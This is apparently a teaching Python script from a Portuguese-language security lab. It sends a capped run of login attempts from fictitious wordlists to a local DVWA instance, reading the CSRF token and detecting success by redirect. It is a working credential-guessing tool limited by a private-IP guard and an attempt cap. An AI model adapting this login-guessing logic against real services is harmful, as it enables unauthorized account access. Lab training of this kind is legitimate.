#!/usr/bin/env python3
"""
03-dvwa-teste-login.py
Teste DIDÁTICO e LIMITADO de login no DVWA LOCAL do laboratório.

Finalidade: observar como um formulário responde a tentativas repetidas quando NÃO há
limitação de tentativas (DVWA nível Low). É a ALTERNATIVA ao Medusa quando a integração
com o formulário web não é direta (token CSRF, sessão, parâmetros específicos).

Onde rodar: Kali Linux, apontando para o SEU DVWA no Metasploitable 2 (rede interna).
Uso:
    python3 03-dvwa-teste-login.py http://10.10.10.5/dvwa

⚠️ USO RESTRITO AO LABORATÓRIO PRÓPRIO E AUTORIZADO.
   - Apenas IP privado de laboratório.
   - Poucas tentativas (limite fixo abaixo).
   - Credenciais FICTÍCIAS vindas das wordlists do projeto.
   - NÃO contorna proteções de sistemas reais.
"""
import sys
import re
import time
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("Instale a dependência:  pip install requests")

# --- Guarda de segurança: só IPs/hosts privados de laboratório ---
PRIV = re.compile(r"https?://(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.0\.0\.1|localhost)")

MAX_TENTATIVAS = 15        # teto didático — não é força bruta de verdade
PAUSA_SEGUNDOS = 0.5       # evita martelar o serviço


def carregar(lista: Path):
    return [l.strip() for l in lista.read_text(encoding="utf-8").splitlines() if l.strip()]


def main():
    if len(sys.argv) != 2:
        sys.exit("Uso: python3 03-dvwa-teste-login.py <URL_BASE_DVWA>")
    base = sys.argv[1].rstrip("/")

    if not PRIV.match(base):
        sys.exit(f"[ABORTADO] '{base}' não é um alvo privado de laboratório.")

    raiz = Path(__file__).resolve().parent.parent
    usuarios = carregar(raiz / "wordlists" / "usuarios-ficticios.txt")
    senhas = carregar(raiz / "wordlists" / "senhas-ficticias.txt")

    login_url = f"{base}/login.php"
    print(f"[*] Alvo DVWA: {login_url}")
    print(f"[*] Teto de tentativas: {MAX_TENTATIVAS} (apenas observação didática)\n")

    tentativas = 0
    for usuario in usuarios:
        for senha in senhas:
            if tentativas >= MAX_TENTATIVAS:
                print(f"\n[*] Teto de {MAX_TENTATIVAS} tentativas atingido. Encerrando.")
                return
            tentativas += 1

            sess = requests.Session()
            try:
                # 1) GET para obter o user_token (CSRF) do DVWA, se existir
                r = sess.get(login_url, timeout=5)
                token_match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)", r.text)
                dados = {"username": usuario, "password": senha, "Login": "Login"}
                if token_match:
                    dados["user_token"] = token_match.group(1)

                # 2) POST da tentativa de login
                resp = sess.post(login_url, data=dados, timeout=5, allow_redirects=False)
                # DVWA redireciona para index.php em caso de sucesso
                local = resp.headers.get("Location", "")
                sucesso = "index.php" in local
                status = "SUCESSO (redirect index.php)" if sucesso else "falha"
                print(f"  [{tentativas:02d}] {usuario} / {senha:<12} -> HTTP {resp.status_code} | {status}")
            except requests.RequestException as e:
                print(f"  [{tentativas:02d}] {usuario} / {senha:<12} -> ERRO de conexão: {e}")

            time.sleep(PAUSA_SEGUNDOS)

    print("\n[OK] Fim do teste. Registre as observações em docs/resultados.md.")
    print("     Compare este comportamento (nível Low) com o nível Medium/High.")


if __name__ == "__main__":
    main()
